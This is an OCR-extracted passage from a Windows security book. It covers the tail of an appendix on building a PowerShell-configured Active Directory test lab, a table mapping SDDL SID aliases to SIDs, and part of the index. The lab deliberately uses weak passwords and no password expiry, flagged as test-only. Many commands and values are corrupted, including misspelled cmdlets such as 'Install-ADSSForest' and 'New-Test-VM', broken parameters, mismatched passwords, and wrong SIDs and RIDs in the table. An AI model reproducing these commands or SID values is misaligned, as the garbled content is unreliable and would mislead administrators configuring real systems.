We install the PRIMARYDC virtual machine from the DVD image file C:\iso\erverio and create the virtual machine in the C:\cups directory. This should create a new directory under the virtual machine directory for the PRIMARYDC server's files, which allows us to separate our resources for each of our virtual machines. Next, we start the virtual machine's user interface so we can interact with the installation process, and then start the virtual machine.

Now that you can interact with the virtual machine, you can follow the installation steps as for any other Window Server installation. I won't provide detailed instructions for this, as it's mostly a case of selecting your region and the installation drive and following the default process.

When asked for the Administrator user's password during the installation, you can set anything you like, but in this book I've assumed it will be set to Password. As this is a weak password, do not expose these virtual machines to a network where untrusted users can access them. However, for testing and demonstration purposes, having easily memorable passwords is usually a good idea.

Once you've gained access to either a desktop (if using the long-term service branch version of the server) or a command line (if using the server core version), you can finish the basic setup. All subsequent PowerShell commands will be run on the VM itself, not the host. First start an administrator copy of PowerShell to run the commands in Listing A-4.

```bash
PS> $index = (Get-NetAdapter).ifindex
PS> New-NetIPAddress -InterfaceIndex $index -IPAddress 192.168.99.10
-PrefixLength 24 -DefaultGateway 192.168.99.1
PS> Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses 8.8.8.8
```

Listing A-4: Setting up the PRIMARYDC virtual machine network

As the network switch we created earlier doesn't include support for DHCP, it won't automatically assign an IP address during installation. Thus, we need to set up the network with static IP addresses. Listing A-4 starts by setting the IP address of the network adapter; you should use the IP address from Table A-1 for the virtual machine you're configuring. The

DefaultGateway parameter should be the IP address you set on the host in Listing A-1 so that traffic can be routed to the external network.

You'll also need to specify a DNS server address for the network adapter. In Listing A-4 we set this to the address of the public Google DNS server, 8.8.8.8. If you know the IP address of your internet provider or another preferred DNS server, use that instead. Once we've finished setting up the domain controller, we'll no longer need this DNS server, as the domain controller has its own DNS server.

You should now be able to access an external network. At this point, you might need to activate your copy of Windows Server if you're not using a trial version. You'll also want to ensure that the copy of Windows is up to date, including all security patches. While the network will isolate the virtual machines from external networks to a degree, this doesn't mean they can't be compromised, so it's best to be certain.

540    Appendix A

---

Next, rename the computer using the Rename-Computer command, as shown in Listing A-5.

```bash
PS> Rename-Computer -NewName "PRIMARYDC" -Restart
```

Listing A-5: Renaming the computer

This name will be used on the domain network, so it helps to have memorable names. Replace PRIMARYDVD with your own name if you prefer.

Once you've renamed the computer, you need to configure the server as the domain controller for the mineral.local domain. Log in to the server as an administrator and run the commands in Listing A-6.

```bash
PS> Install-WindowFeature AD-Domain-Services
PS> Install-ADSSForest -DomainName mineral.local -DomainNetbiosName MINERAL
-InstallDns -Force
SafeModeAdministratorPassword: **********
Confirm SafeModeAdministratorPassword: **********
```

Listing A-6: Installing and configuring the Active Directory domain services

First, we install the AD-Domain-Service feature. This feature installs the Active Directory server and associated services to run the server as a domain controller. Next, we run the Install-ADDSForest command to set up the forest and create the root domain. We specify the DNS name of the domain, which in this case is mineral.local . We also specify the simple name of the domain as MINERAL and request that a local DNS server be installed. Active Directory can't work without a DNS server, and as this is an isolated network, it makes sense to run the DNS server on the domain controller server.

When setting up the forest, you'll be asked to specify a safe-mode administrator password. This password allows you to recover the Active Directory database. In such a small, non-production domain, you're unlikely to need this feature, but you should still specify a password you can remember. You're likely to see a few warnings during the installation; you can safely ignore these. Once the command has completed, the server will reboot automatically.

When it has finished rebooting you should reauthenticate to the server, but make sure to use the username MINERALAdministrator so that you can use the domain administrator account. The password for the domain administrator should be the same as the one you initially configured when installing the server. Then, start an instance of PowerShell and run the commands in Listing A-7 to do some basic user setup.

```bash
# PS> Set-ADDefaultDomainPasswordPolicy -Identity mineral.local
- MaxPasswordAge 0
# PS> $pwd = ConvertTo-SecureString -String "PasswOrdi" -AsPlainText -Force
# PS> New-ADUser -Name alice -Country USA -AccountPassword $pwd
-GivenName "Alice Bombas" -Enabled $true
# PS> $pwd = ConvertTo-SecureString -String "PasszOrdi" -AsPlainText -Force
# PS> New-ADUser -Name bob -Country JP -AccountPassword $pwd
-GivenName "Bob Cordite" -Enabled $true
```

Building a Windows Domain Network for Testing  541

---

```bash
❸ PS: New-ADGroup -Name 'Local Resource' -GroupId DomainLocal
PS: Add-ADGroupMember -Identity 'Local Resource' -Members 'alice'
PS: New-ADGroup -Name 'Universal Group' -GroupId Universal
PS: Add-ADGroupMember -Identity 'Universal Group' -Members 'bob'
PS: New-ADGroup -Name 'Global Group' -GroupId Global
PS: Add-ADGroupMember -Identity 'Global Group' -Members 'alice', 'bob'
```

Listing A-7: Configuring the domain password policy and adding users and groups

First, we set the domain's password policy to prevent passwords from expiring ❶ . There's nothing worse than coming back to your virtual machines after a few months and being faced with changing the passwords, which you immediately forget.

NOTE

Even though the default password expiry for a new domain is 42 days, Microsoft no longer recommends having forced password expiry enabled. This is because making users change their password frequently can cause more harm than good by encouraging them to use trivial passwords, so they don't forget them.

We then create two domain users, alive and bob , assigning each of them a password ❷ . We also set a few Active Directory attributes for each user: specifically, their name and country. I've summarized the values to specify in Table A-2 . Of course, you can set the names and values to anything you prefer.

Table A-2: Default Users for the Root Domain

<table><tr><td>Username</td><td>Given name</td><td>Country</td><td>Password</td></tr><tr><td>alice</td><td>Alice Bombas</td><td>USA</td><td>Password1</td></tr><tr><td>bob</td><td>Bob Cordite</td><td>JP</td><td>Password2</td></tr></table>


The final task in Listing A-7 is to create three Active Directory groups ❸ one for each group scope. We also assign the two users to a combination of these groups.

## The GRAPHITE Workstation

With the domain controller configured, we can now set up a workstation. Run the script in Listing A-8 to create the virtual machine, as we did with

PRIMARYDC .

```bash
PS> New-TestVM -VmName "GRAPHITE" -InstallerImage "C:\iso\client.iso"
-VMDirectory "C:\vm"
PS> vmconnect localhost GRAPHITE
PS> Start-VM -VmName "GRAPHITE"
```

Listing A-8: Creating and starting the GRAPHITE virtual machine

In this case, you'll use a disk image of Windows Professional or Enterprise, rather than a server installation. Any currently supported version of Windows 10 or greater is sufficient. Proceed with the installation as

---

you normally would, creating the machine's username and password. This book assumes you'll use the username admin and a password of Password, but you can pick any username and password you prefer.

Listing A-9 sets up the network, as in Listing A-4.

```bash
PS> $index = (Get-NetAdapter)-ifIndex
  -New-NetIPAddress -InterfaceIndex $index -IPAddress 192.168.99.50
-PrefixLength 24 -DefaultGateway 192.168.99.1
-PS> Set-DnsClientServerAddress -InterfaceIndex $index
-ServerAddresses 192.168.99.10
PS> Resolve-DnsName primarydc.mineral.local
Name
Type
TTL
Section
IPAddress
primarydc.mineral.local  A   3600  Answer
192.168.99.10
PS> Rename-Computer -NewName "GRAPHITE" -Restart
```

Listing A.9: Setting the domain DNS server and checking that it resolves

The only difference here is that we configure the DNS server to use the one we installed on the domain controller at 192.168.99.10. You can verify that the DNS server is working correctly by attempting to resolve the primaryde .mineal.local server address. You should also be able to resolve internet domain names, as the domain controller will forward the requests onward.

Again, once you've configured this network, you'll want to ensure that you've activated your Windows installation if necessary and downloaded any updates. If desired, you can rename the workstation to your chosen name before continuing.

In Listing A-10, we join the workstation to the domain.

```bash
PS> $creds = Get-Credential
PS> Add-Computer -DomainName MINERAL -Credential $creds
WARNING: The changes will take effect after you restart the computer GRAPHITE.
PS> Add-LocalGroupMember -Group 'Administrators' -Member 'MINERAL\alice'
PS> Restart-Computer
```

Listing A-10: Joining the GRAPHITE workstation to the domain

The first thing we need are the credentials for a user in the domain. As I explained in Chapter 11, this user doesn't need to be a domain administrator; it can be a normal user. For example, you can enter the credentials for the alive user when prompted by the Get-Commander command's GUI.

Next, we call the Add-Computer command to join the workstation to the MINERAL domain with the user's credentials. If this succeeds, it will print a warning telling you to restart the computer. However, don't restart it just yet; you first need to add a domain user, such as alce , to the local Administrators group using the Add-LocalGroupMember command. If you don't do this step, you'll subsequently have to authenticate to the workstation using either a domain administrator or the original local administrator account. Adding a user to this group allows you to authenticate as that user and be a local administrator. Once this is done, you can reboot.

Building a Windows Domain Network for Testing  543

---

That's all there is to setting up a workstation. You can configure the rest of the workstation's settings through the group policy on the domain controller. Once the workstation has restarted, you should be able to authenticate as any domain user.

## The SALESDC Server

The SALESD virtual machine is a Windows server that serves a domain controller for the sales.mineral.local.domain within the forest. Setting up this machine (or its sibling, ENGDC) is optional; you don't need multiple domain forests to run most of the examples in this book. However, it will allow you to test different behaviors.

Listing A-11 includes the same commands as those run for the PRIMARYDC virtual machine, with different values.

```bash
PS> New-Test-VM -VmName "SALESDC" -InstallerImage "C:\iso\server.iso"
    -VmDirectory "C:\vm"
PS> vmconnect localhost SALESDC
PS> Start-VM -VmName "SALESDC"
```

Listing A-11: Creating and starting the SALESDC virtual machine

Follow the normal installation process, and when asked for the


Administrator user's password, set it to anything you like. In this book, I've assumed it will be set to Password.

Listing A-12 configures the virtual machine's network using the DNS server on PRIMARYDC.

```bash
PS> $index = (Get-Net-Adapter).ifindex
PS> New-NetIPAddress -InterfaceIndex $index -IPAddress 192.168.99.110
-PrefixLength 24 -DefaultGateway 192.168.99.1
PS> Set-DnsClientServerAddress -InterfaceIndex $index
-ServerAddresses 192.168.99.10
PS> Rename-Computer -NewName "SALEDC" -Restart
```

Listing A-12: Setting up the SALESDC virtual machine network

It's crucial that the DNS client point to the root domain controller when creating a new domain in the forest so that you can resolve the root domain information. Once you've renamed the computer, you'll need to configure the server as the domain controller for the sales.mineral.local domain. Log in to the server as an administrator and run the commands in Listing A-13.

```bash
PS> Install-WindowFeature AD-Domain-Services
PS> Install-ADSDomain -NewDomainName Sales -ParentDomainName mineral.local
-NewDomainNetbiosName SALES -InstallDns -Credential (Get-Credential) -Force
SafeModeAdministratorPassword: **********
Confirm SafeModeAdministratorPassword: **********
```

Listing A-13: Installing and configuring the Active Directory domain services for a child domain

544    Appendix A

---

Here, you first install the AD-Domain-Services feature as before, then run the Install-ADODomain command to create a new domain in an existing forest. You'll be prompted for the safe-mode password, as with the root domain. You must also specify an administrator account in the root domain to establish the trust relationship. You can use the existing MINERAL Administrator account for this.

If this succeeds, the server should reboot. When you can reauthenticate as the SALESAdministrator user, you can verify that you've set up a trusted connection by using the Get-ADTrust command, as shown in Listing A-14.

```bash
PS> Get-ADTrust -Filter * | Select Target, Direction
Target        Direction
------        ---------
mineral.local    B3Direction1
```

Listing A-14: Verifying the trust relationship between the SALES and root domains

You should see a single entry for the root mineral.local domain. If the command fails, wait a few minutes for everything to start and retry.

At this point, you can add your own users and groups to the SALES domain, which will be separate from the root domain, although the users should be able to authenticate across domains due to the configured trust relationship. You can also install your own workstations using the steps outlined for GRAPHITE, making sure to specify the DNS server using the SALESDS IP address.

You can also create a separate engineering domain in the forest, or anything else you'd like. Just repeat these steps, changing the IP addresses and names you assign. You should then have a basic domain and forest configuration with which to run the examples in this book.

While we've configured every system you'll need for the book, you are free to configure and customize these domains further if you wish. Bear in mind that changing certain configurations, such as names or passwords, might change the input you'll need to provide in the book's examples.

---



---

## B  SDDL SID ALIAS MAPPING

![Figure](figures/WindowsSecurityInternals_page_577_figure_001.png)

Chapter 5 introduced the Security Descriptor Definition Language (SDDL) format for expressing a security descrip-

tor as a string and gave some examples of the two-character aliases that Windows supports for wellknown SDDL SIDs. While Microsoft documents the SDDL format for SIDs, it provides no single resource listing all the short SID alias strings. The only available resource is the sddl.h header in the Windows SDK. This header defines the Windows APIs a programmer can use to manipulate SDDL format strings and provides a list of short SID alias strings.

Table B-1 contains the short aliases along with the names and full SIDs that they represent. The table was extracted from the header provided with the SDK for Windows 11 (OS build 22621), which should be the canonical

---

list at the time of writing. Note that some SID aliases work only if you're connected to a domain network. You can identify these by the <DOMAIN> placeholder in the SID name, which you should replace with the name of the domain the system is connected to. Also replace the <DOMAIN> placeholder in the SDDL SID string with the unique domain SID.

Table B-1: Supported Mappings of SDDL SID Aliases to SIDs

<table><tr><td>SID alias</td><td>Name</td><td>SDDL SID</td></tr><tr><td>AA</td><td>BUILTIN\Access Control Assistance Operators</td><td>S-1-5-32-579</td></tr><tr><td>AC</td><td>APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES</td><td>S-1-15-2-1</td></tr><tr><td>AN</td><td>NT AUTHORITY\ANONYMOUS LOGON</td><td>S-1-5-7</td></tr><tr><td>AO</td><td>BUILTIN\Account Operators</td><td>S-1-5-32-548</td></tr><tr><td>AP</td><td>&lt;DOMAIN&gt;Protected Users</td><td>S-1-5-21-&lt;DOMAIN&gt; -S25</td></tr><tr><td>AS</td><td>Authentication authority asserted identity</td><td>S-1-18-1</td></tr><tr><td>AU</td><td>NT AUTHORITY\Authenticated Users</td><td>S-1-5-11</td></tr><tr><td>BA</td><td>BUILTIN\Administrators</td><td>S-1-5-32-544</td></tr><tr><td>BG</td><td>BUILTIN\Guests</td><td>S-1-5-32-546</td></tr><tr><td>BO</td><td>BUILTIN\Backup Operators</td><td>S-1-5-32-551</td></tr><tr><td>BU</td><td>BUILTIN\Users</td><td>S-1-5-32-545</td></tr><tr><td>CA</td><td>&lt;DOMAIN&gt;Cart Publishers</td><td>S-1-5-21-&lt;DOMAIN&gt; -S17</td></tr><tr><td>CD</td><td>BUILTIN\Certificate Service DCOM Access</td><td>S-1-5-32-574</td></tr><tr><td>CG</td><td>CREATOR GROUP</td><td>S-1-3-1</td></tr><tr><td>CN</td><td>&lt;DOMAIN&gt;Cloneable Domain Controllers</td><td>S-1-5-21-&lt;DOMAIN&gt; -S22</td></tr><tr><td>CO</td><td>CREATOR OWNER</td><td>S-1-1-3-0</td></tr><tr><td>CY</td><td>BUILTIN\Cryptographic Operators</td><td>S-1-5-32-569</td></tr><tr><td>DA</td><td>&lt;DOMAIN&gt;Domain Admins</td><td>S-1-5-21-&lt;DOMAIN&gt; -S12</td></tr><tr><td>DC</td><td>&lt;DOMAIN&gt;Domain Computers</td><td>S-1-5-21-&lt;DOMAIN&gt; -S15</td></tr><tr><td>DD</td><td>&lt;DOMAIN&gt;Domain Controllers</td><td>S-1-5-21-&lt;DOMAIN&gt; -S16</td></tr><tr><td>DG</td><td>&lt;DOMAIN&gt;Domain Guests</td><td>S-1-5-21-&lt;DOMAIN&gt; -S14</td></tr><tr><td>DU</td><td>&lt;DOMAIN&gt;Domain Users</td><td>S-1-5-21-&lt;DOMAIN&gt; -S13</td></tr><tr><td>EA</td><td>&lt;DOMAIN&gt;Enterprise Admins</td><td>S-1-5-21-&lt;DOMAIN&gt; -S19</td></tr><tr><td>ED</td><td>NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS</td><td>S-1-5-9</td></tr><tr><td>EK</td><td>&lt;DOMAIN&gt;Enterprise Key Admins</td><td>S-1-5-21-&lt;DOMAIN&gt; -S27</td></tr><tr><td>ER</td><td>BUILTIN\Event Log Readers</td><td>S-1-5-32-573</td></tr><tr><td>ES</td><td>BUILTIN\NDS Endpoint Servers</td><td>S-1-5-32-576</td></tr><tr><td>HA</td><td>BUILTIN\Hyper-V Administrators</td><td>S-1-5-32-578</td></tr><tr><td>HI</td><td>Mandatory Label\High Mandatory Level</td><td>S-1-16-12288</td></tr><tr><td>IS</td><td>BUILTIN\IS_USRS</td><td>S-1-5-32-568</td></tr></table>


---

<table><tr><td>SID alias</td><td>Name</td><td>SDDL SID</td></tr><tr><td>IU</td><td>NT AUTHORITY\INTERACTIVE</td><td>S-1-5-4</td></tr><tr><td>KA</td><td>&lt;DOMAIN&gt;Key Admins</td><td>S-1-5-21-&lt;DOMAIN&gt;-526</td></tr><tr><td>LA</td><td>&lt;DOMAIN&gt;Administrator</td><td>S-1-5-21-&lt;DOMAIN&gt;-500</td></tr><tr><td>LG</td><td>&lt;DOMAIN&gt;Guest</td><td>S-1-5-21-&lt;DOMAIN&gt;-501</td></tr><tr><td>LS</td><td>NT AUTHORITY\LOCAL SERVICE</td><td>S-1-5-19</td></tr><tr><td>LU</td><td>BUILTIN\Performance Log Users</td><td>S-1-5-32-559</td></tr><tr><td>LW</td><td>Mandatory Label\Low Mandatory Level</td><td>S-1-16-4096</td></tr><tr><td>ME</td><td>Mandatory Label\Medium Mandatory Level</td><td>S-1-16-8192</td></tr><tr><td>MP</td><td>Mandatory Label\Medium Plus Mandatory Level</td><td>S-1-16-8448</td></tr><tr><td>MS</td><td>BUILTIN\ARDS Management Servers</td><td>S-1-5-32-577</td></tr><tr><td>MU</td><td>BUILTIN\Performance Monitor Users</td><td>S-1-5-32-558</td></tr><tr><td>NO</td><td>BUILTIN\Network Configuration Operators</td><td>S-1-5-32-556</td></tr><tr><td>NS</td><td>NT AUTHORITY\NETWORK SERVICE</td><td>S-1-5-20</td></tr><tr><td>NU</td><td>NT AUTHORITY\NETWORK</td><td>S-1-5-2</td></tr><tr><td>OW</td><td>OWNER RIGHTS</td><td>S-1-3-4</td></tr><tr><td>PA</td><td>&lt;DOMAIN&gt;Group Policy Creator Owners</td><td>S-1-5-21-&lt;DOMAIN&gt;-520</td></tr><tr><td>PO</td><td>BUILTIN\Print Operators</td><td>S-1-5-32-550</td></tr><tr><td>PS</td><td>NT AUTHORITY\SELF</td><td>S-1-5-10</td></tr><tr><td>PU</td><td>BUILTIN\Power Users</td><td>S-1-5-32-547</td></tr><tr><td>RA</td><td>BUILTIN\RDS Remote Access Servers</td><td>S-1-5-32-575</td></tr><tr><td>RC</td><td>NT AUTHORITY\RESTRICTED</td><td>S-1-5-12</td></tr><tr><td>RD</td><td>BUILTIN\Remote Desktop Users</td><td>S-1-5-32-555</td></tr><tr><td>RE</td><td>BUILTIN\Replicator</td><td>S-1-5-32-552</td></tr><tr><td>RM</td><td>BUILTIN\Remote Management Users</td><td>S-1-5-32-580</td></tr><tr><td>RO</td><td>&lt;DOMAIN&gt;\Enterprise Read-only Domain Controllers</td><td>S-1-5-21-&lt;DOMAIN&gt;-498</td></tr><tr><td>RS</td><td>&lt;DOMAIN&gt;\RAS and IAS Servers</td><td>S-1-5-21-&lt;DOMAIN&gt;-553</td></tr><tr><td>RU</td><td>BUILTIN\Pre-Windows 2000 Compatible Access</td><td>S-1-5-32-554</td></tr><tr><td>SA</td><td>&lt;DOMAIN&gt;\Schema Admins</td><td>S-1-5-21-&lt;DOMAIN&gt;-518</td></tr><tr><td>SI</td><td>Mandatory Label\System Mandatory Level</td><td>S-1-16-16384</td></tr><tr><td>SD</td><td>BUILTIN\Server Operators</td><td>S-1-5-32-549</td></tr><tr><td>SS</td><td>Service asserted identity</td><td>S-1-18-2</td></tr><tr><td>SU</td><td>NT AUTHORITY\SERVICE</td><td>S-1-5-6</td></tr><tr><td>SY</td><td>NT AUTHORITY\SYSTEM</td><td>S-1-5-18</td></tr><tr><td>UD</td><td>NT AUTHORITY\USER MODE DRIVERS</td><td>S-1-5-84-0-0-0-0-0</td></tr><tr><td>WD</td><td>Everyone</td><td>S-1-1-0</td></tr><tr><td>WR</td><td>NT AUTHORITY\WRITE RESTRICTED</td><td>S-1-5-33</td></tr></table>


SDDL Sid Alias Mapping 549

---



---

## INDEX

### A

absolute security descriptors, 149-151, 164 Abstract category attribute, 354 access checks, 25, 36, 222, 265 Active Directory, 366 automating, 275-277 discretionary, 228, 241-244, 249, 259 enterprise, 249-260 handle duplication, 269-272 kernel-mode, 222-225 mandatory (MACs), 228, 230-237, 242 object type, 249-255 in PowerShell, 227-244 remote access check protocol, 389-390 sandbox token checks, 244-249, 272-274 thread process, 271-272 token, 227-228, 230, 237-241 traversal checks, 266-269 user-mode, 225 worked examples, 261-263, 277-279 access control entries (ACEs), 145, 153-156. See also names of specific ACEs access filter, 233 callback, 156 compound, 154-155, 213-214 discretionary access control lists, 145-146 finding resources with Audit ACEs, 294-295 flags, 156 flag strings mapped to, 167 mandatory label, 154, 167, 172, 201-203

normal, 154–155 object, 154–155 ordering, 158–159 security access control lists, 145–146 supported types, 153 type strings mapped to ACE types, 167 access control lists (ACLs), 151–156 ACEs, 153–156 DACIIs, 145–146, 186, 215 flag strings mapped to control flags, 166 headers, 152–153 NULL ACLs, 146 SACIIs, 144–146, 288–289, 292–293 AccessFilter ACEs, 154, 156, 167 access masks, 155 access strings mapped to, 168 closing handles, 40 converting, 38–39 displaying, 37–38 handle tables, 39–40 numeric value of, 39 generic mapping tables, 37 types of access, 36–37 access mode, 223–224 access strings for file and registry types, 169 mandatory label access strings, 172 mapped to access masks, 168 AccessSystemSecurity access right, 37, 178 access tokens, 25 AccountNotDelegated flag, 490 ACE flag strings, 167 ACEs. See access control entries; names of specific ACEs ACL flag strings, 166 ACLs. See access control lists

1

---

Active Directory, 341-396 access checks, 366-382 claims and central access policies, 382-384 domain configuration, 342-349 enterprise network domains, 301-302 group policies, 384-386 interactive authentication, 404 objects, 349-353 Objecttype GUIDs used in, 169 property hierarchy, 250-251 schema, 353-358 security descriptors, 358-366 worked examples, 387-395

Add- commands, 49-52, 59, 84, 157, 251, 309, 311, 324, 371, 389, 543, 415, 417-418

AddMember access right, 318 AddMember function, 588 Ab-Domain-Services feature, 541, 545 AdjustDefault access right, 100 AdjustGroups access right, 100 AdjustPrivileges access right, 100, 320 AdjustQuotas access right, 320 AdjustSessionId access right, 100 AdjustSystemAccess access right, 320 AdministerServer access right, 315 administrator users, 122-124 LSalogfon User API, 409-410 removing privileges, 140-141 SAM database, 326 verifying tokens, 123-124

Advanced Encryption Standard (AES), 327-332 AES keys, 470-471, 496 advanced local procedure call (ALPC) subsystem, 24, 55 AFD (Ancillary Function Driver), 47 Alarm ACEs, 154, 292 AlarmCallback ACEs, 154, 292 AlarmObject ACEs, 154, 292 aliases, 12-13, 166, 318, 548 Allowed ACEs, 153-154, 158, 167 AllowedCallback ACEs, 154, 167 AllowedCallbackObject ACEs, 154, 167 AllowedCompound ACEs, 154-155

AllowedObject ACEs, 154, 167 ALPC (advanced local procedure call) subsystem, 24, 55 Ancillary Function Driver (AFD), 47 Anonymous flag, 518 Anonymous impersonation level, 104, 106, 136 anonymous sessions, 518–519 Anonymous type, 53 Anonymous user token, 214 ANSI strings, 79 APIs AcceptSecurityContext API, 426–427 AcquireCredentialsHandle API, 424 AuthAccessCheck API, 156, 243 AuthZ API, 387, 389–390 Create APIs, 77–79, 87–90, 107, 117, 135, 298, 412–413 Data Protection API (DPAPI), 322, 516 DecryptMessage API, 440–441, 476 EncryptMessage API, 440–442 ExIsRestrictedCaller API, 272 Generic Security Services API, 476 Get APIs, 65–66, 78, 208–209, 212 ImpersonateNamedPipe API, 104 InitializeSecurityContext API, 423–424 LoadLibrary API, 65, 68 LogonUser API, 102, 401 LsaloOnSler API, 399–414 accessing from PowerShell, 410–412 creating user desktops, 398–399 domain authentication, 403–404 local authentication, 401–402 logon and console sessions, 404–406 logon types, 400 protocol transition delegation, 489 security packages, 400–401 token creation, 407–410 LsaManageSidNameMapping API, 323–324

552  Index

---

lsaOpenPolicy API, 318-319 MakeSignature API, 441-443 NtAccessCheckByType API, 249 prefix-to-subsystem mapping, 24-25 Query APIs, 430, 442 RtlDosPathNameofntPathName API, 83, 86 RtlIsSandboxToken API, 272, 274 Sam APIs, 313-316 SeAccessCheck API, 222-223 SeAccessCheckByType API, 249 SeAssignSecurityEx API, 180-182 SeCreateClientSecurity API, 484 SeImpersonateClient API, 484 SeSetSecurityDescriptorInfoEx API, 206-207 SetNamedSecurityInfo API, 208-210 SeTokenCanImpersonate API, 136 SetPrivateObjectSecurityEx API, 208 sets, 67-68 Shell, 89-91 VerifySignature API, 440-441 Win32 security APIs, 64-70, 77-80, 208-213 WinSock API, 47 AppContainer process, 120-122 Application Information service, 93 application package authority, 120 AP-REP message. See authentication protocol reply message AP-REQ (authentication protocol request) message, 494, 519-520 array type, 5 asInvoker UAC execution level, 126 AS-REP (authentication service reply) message, 459 AS-REQ (authentication service request) message, 458 AssignPrimary access right, 100 Audit ACEs, 153, 167, 294-295 AuditCallback ACEs, 154, 167 AuditCallbackObject ACEs, 154 auditing. See security auditing AuditLogAdmin access right, 319 AuditObject ACEs, 154, 167

audit policy security, 287–293 configuring global SACL, 292–293 configuring resource SACL, 288–291 authentication audit event log, 524–527 authentication protocol reply (AP-REP) message decryption, 476–477 designation, 481 Kerberos authentication in PowerShell, 468–469 Negotiate security package, 505 network service authentication, 463–464 authentication protocol request (AP-REQ) message, 494, 519–520 cross-domain authentication, 478 decryption, 469–476 designation, 481–483, 485–487 Kerberos authentication in PowerShell, 466–469 Negotiate security package, 505 network service authentication, 463–464 U2U authentication, 491–493 authentication protocol transitions, 486–487, 490 authentication service reply (AS-REP) message, 459 authentication service request (AS-REQ) message, 458 authentication tokens, 423, 500 Authencode mechanism, 54 Auth2AccessCheck function, 387 auto-inherit flags, 161, 181–182, 203, 209–210, 215 Auxiliary category attribute, 354

## B

BackgroundColor parameter, 16 BaseNamedObjects (BNO) directory, 29 console sessions, 76–77 finding object manager resource owners, 216–217 querying security descriptor and owner for, 179 Win32 APIs vs. system calls, 78

Index 553

---

bitwise operators, 6 BNO directory. See BaseNamedObjects directory

Boolean operators, 6 bool type, 5 brute-force attacks, 428-429, 465

## C

canonicalization, 84-85, 362 CBC (cipher block chaining), 330 central access policies, 255-260 access checks, 258-259 Active Directory, 382-384 claims, 255-256, 382-384 displaying, 257 enabling, 259-260 information contained in, 257 simple configuration vs., 256 ChangePassword access right, 316, 377 channel binding, 444-445 ChannelBindings buffer flag, 500 Chrome web browser, 117 cipher block chaining (CBC), 330 ciphertext-stealing mode (CTS), 466 Citrix, 77 claims Active Directory, 382-384 device, 255-256 user, 255-256 Class88 category attribute, 354 Client Server Runtime Subsystem (CSRSS), 71 CLI XML format, 20-21 CloudAP security package, 403 code Integrity, 54-55 Authenticode mechanism, 54 kernel, 24 prefix, 25 purpose of, 54 COM (Component Object Model) server processes, 93 command line parsing, 88-89 commands. See also names of specific commands accepting parameters, 9 accessing properties and methods, 9 aliases, 12-13 discovering, 10


1

executing, 9-10 line breaks, 9-10 naming conventions, 9 passing output of one to another, 9 usage examples of, 11-12

Commit state value, 50 Compare- commands, 42, 231, 233 Component Object Model (COM) server processes, 93 conditional expressions, 155, 169-171 access filter ACEs, 233-235 central access policy, 255, 257-259 infix operators for, 171 type values, 170 unary operators for, 170 Confidentiality request attribute flag, 440-441, 451 configuration manager. See registry Connect access right, 313 console sessions, 83, 416-417 creating user desktops, 398 impersonation tokens, 137 Remote Desktop Services, 74-75 separation of named objects, 76-77 session ID, 102, 405 Windows logon process, 92 constrained delegation (Service for User), 480, 484-491 Kerberos-only, 485-486, 490 protocol transition, 486-488, 490 resource-based, 489-491 constructors, 8 ContainerInherit ACE flag, 156, 167, 193-194, 202 context tracking mode, 106 ControlAccess access right, 366, 378 control access rights, 376-379, 394 control flags, 144-145, 166, 173, 182, 193-194, 215, 381 Dacl, 144-146, 166, 181-182, 194, 215 RmControlValid, 149 Sacl, 144-145, 166, 181 SelfRelative, 149-151 ServerSecurity, 213-214 TrustedforDelegation, 381, 482 TrustedToAuthenticateFor Delegation, 381


1

---

ConvertFrom- commands, 155–156, 163, 175, 502, 509 ConvertTo-NtSecurity@script command, 218 Copy- commands, 41, 107–108, 140 CreateAccount access right, 319–320 CreateAlias access right, 315 CreateChild access right, 366–368 CreateDirectories property, 267 CreateDomain access right, 313 CreateGroup access right, 315, 317 CreatePrivilege access right, 319 CreateSecret access right, 319 CreateUser access right, 315 creator security descriptors, 180 assigning during resource creation, 180–188 inheritance rules, 215 Credential Guard, 484 credential manager, 514–517 GredSSP protocol, 510–513 Critical ACE flag, 156, 167, 208 cross-domain authentication, 477–479 cryptographic derivation process, 431–433 CSSRS (Client Server Runtime Subsystem), 71 CSV files, 20 CTS (ciphertext-stealing mode), 466 CVE security issues 2014-6324, 475 2014-6349, 278 2018-0748, 184 2018-0983, 212 2019-0943, 57, 271 2020-1472 (Zeroologon), 403 2020-1509, 523 2020-17136, 225 2021-34470, 368

## D

DAC (discretionary access control), 36, 143 Dacl control flags, 144–146, 166, 181–182, 194, 215 DACLS. See discretionary access control lists Dacl security information flag, 211

DAP (Directory Access Protocol), 342 data buffer flag, 500, 502 Data Encryption Standard (DES), 332–333 Datagram Transport Layer Security (DTLS) protocol, 506 Data Protection API (DPAPI), 322, 516 DCOM Server Process Launcher, 93 Delegate flag, 483 delegation, 479–480 constrained, 480, 484–491 unconstrained, 480–484 Delegation impersonation level, 105–107 Delete access right, 36, 168, 369 DeleteChild access right, 366, 369 DeleteTree access right, 366, 369 Denied ACEs, 153–154, 158, 167, 243, 255 DeniedCallback ACEs, 154, 167 DeniedCallbackObject ACEs, 154 DeniedObject ACEs, 154, 167, 252–253, 255 DeniedCallback ACEs, 243 DES (Data Encryption Standard), 332–333 DesiredAccess parameter, 30, 36, 79 Desktop objects, 71–72 desktop window manager (DWM) process, 92, 405 DHCP (Dynamic Host Configuration Protocol), 537, 540 Diffie-Hellman key exchange, 477, 508 Directory Access Protocol (DAP), 342 Directory objects, 28, 169, 219 Disable-NTokenPrivilege command, 114 discretionary access checks, 228, 250, 241–243 discretionary access control (DAC), 36, 143 discretionary access control lists (DACLs), 145–146 control flags, 144–146, 166, 181–182, 194, 215 default, 186 inheritance rules, 215 DistinguishedName attribute, 351 distinguished names, 349–351 DLLMain function, 66

Index 555

---

